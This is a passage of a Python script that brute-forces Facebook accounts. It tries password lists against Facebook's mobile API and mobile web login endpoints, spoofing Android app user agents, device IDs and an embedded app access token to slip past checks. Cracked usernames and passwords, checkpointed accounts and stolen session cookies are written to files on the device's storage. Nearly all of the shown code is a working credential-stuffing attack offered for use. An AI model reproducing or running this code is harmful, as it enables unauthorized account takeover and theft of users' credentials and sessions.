            ux=f'Dalvik/2.1.0 (Linux; U; Android {andoid_version}; Z6356T Build/RP1A.201005.001) [FBAN/Orca-Android;FBAV/{face_version};FBPN/{fks_version};FBLC/en_AU;FBBV/{fbv_version};FBCR/Telstra;FBMF/ZTE;FBBD/ZTE;FBDV/Z6356T;FBSV/11;FBCA/arm64-v8a:null;FBDM/'+'{density=2.0,width=720,height=1476}'+';FB_FW/1;]'
            ux=f'Dalvik/2.1.0 (Linux; U; Android {andoid_version}; Leelbox Build/PPR1.281373.396) [FBAN/FB4A;FBAV/{face_version};FBBV/{fbv_version};FBDM/'+'{density=3.0,width=1080,height=2208}'+';FBLC/en_GB;FBRV/216077496;FBCR/inwi;FBMF/OPPO;FBBD/OPPO;FBPN/{fks_version};FBDV/CPH1989;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
            ux=f'Dalvik/2.1.0 (Linux; U; Android {andoid_version}; moto g play - 2023 Build/S3SGS32.39-181-5) [FBAN/Orca-Android;FBAV/{face_version};FBPN/{fks_version};FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=1.75,width=720,height=1439}'+';FB_FW/1;]'
            ux='Dalvik/2.1.0 (Linux; U; Android 9; JKM-LX1 Build/HUAWEIJKM-LX1) [FBAN/MessengerLite;FBAV/273.0.0.16.48;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/325178905;FBCR/null;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/JKM-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2137};]'
            ux='Dalvik/2.1.0 (Linux; U; Android 5.1; Vowney Build/LMY47I) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270172;FBCR/null;FBMF/elephone;FBBD/elephone;FBDV/Vowney;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2368};FB_FW/1;]'
            accessToken = "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())
            data = {'adid':adid,'format':'json','device':'D6503','device_id':adid,'email':ids,'password':pas,"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),'generate_analytics_claims':'1','credentials_type':'password','source':'login',"sim_country": "id","network_country": "id","relative_url": "method/auth.login",'error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1',"locale":"en_US","client_country_code":"US",'fb_api_req_friendly_name':'authenticate',"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
            head ={'Authorization':f'OAuth {accessToken}',"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE","X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(20000, 40000)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),'X-FB-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','X-FB-device-group': str(random.randint(2000, 4000)),"X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice",'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','X-FB-connection-quality':'EXCELLENT',"X-Tigon-Is-Retry": "False",'User-Agent':pro,"X-FB-connection-token": "d29d67d37eca387482a8a5b740f84f62",'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded',"X-FB-Client-IP": "True","X-FB-Server-Cluster": "True",'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://b-api.facebook.com/method/auth.login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'session_key' in q:
                uid=str(q['uid'])
                lk_remove = f'https://graph.facebook.com/{uid}/picture?type=normal'
                baby = requests.get(lk_remove).text
                if 'Photoshop' in baby:
                    print(f'\r\r{A}[BLACK-OK] '+uid+' | '+pas+'\033[1;97m')
                    open('/sdcard/BLACK-RANDM-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                print(f'\r\r{Y}[BLACK-CP] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/BLACK-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
        
  
def randmmethod(ids,passlist):
    global loop,cps,oks,agents
    try:
        for pas in passlist:
            fss=random.choice(['p.facebook.com','x.facebook.com','m.facebook.com','www.facebook.com','e.facebook.com'])
            version_fm=random.choice(['9','10','11','12','13'])
            session = requests.Session()
            sys.stdout.write(f'\r\r{Y}[BLACK-XD]{G} %s OK{Y}|{G}CP %s{Y}|{G}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
            pro = random.choice(ugen)
            m_fb = session.get('https://x.facebook.com/?tbua=1').text
            log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(m_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(m_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(m_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(m_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pas,"login":"Log In"}
            header_freefb={
    'authority': f'{fss}',
    'method':'POST',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'dpr': '2.700000047683716',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': f"{AMSS3}",
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': f"{version_fm}.0.0",
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                lk_remove = f'https://graph.facebook.com/{uid}/picture?type=normal'
                lk_rmv = requests.get(lk_remove).text
                if 'Photoshop' in lk_rmv:
                    print(f'\r\r{Y}[{G}BLACK-OK{Y}]{G} '+uid+' | '+pas+'\033[1;97m');print(f"\r\r{G}[COKI]{A} "+coki);open('/sdcard/BLACK-RANDOM-OK-COKI.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n");oks.append(ids);break
                else:pass
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[141:156]
                print(f'\r\r{Y}[{Y}BLACK-CP{Y}]{Y} '+uid+' | '+pas+'\033[1;97m')
                open('/sdcard/BLACK-RANDOM-CP.txt','a').write(uid+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------------------( END )-------------------------#     
menu()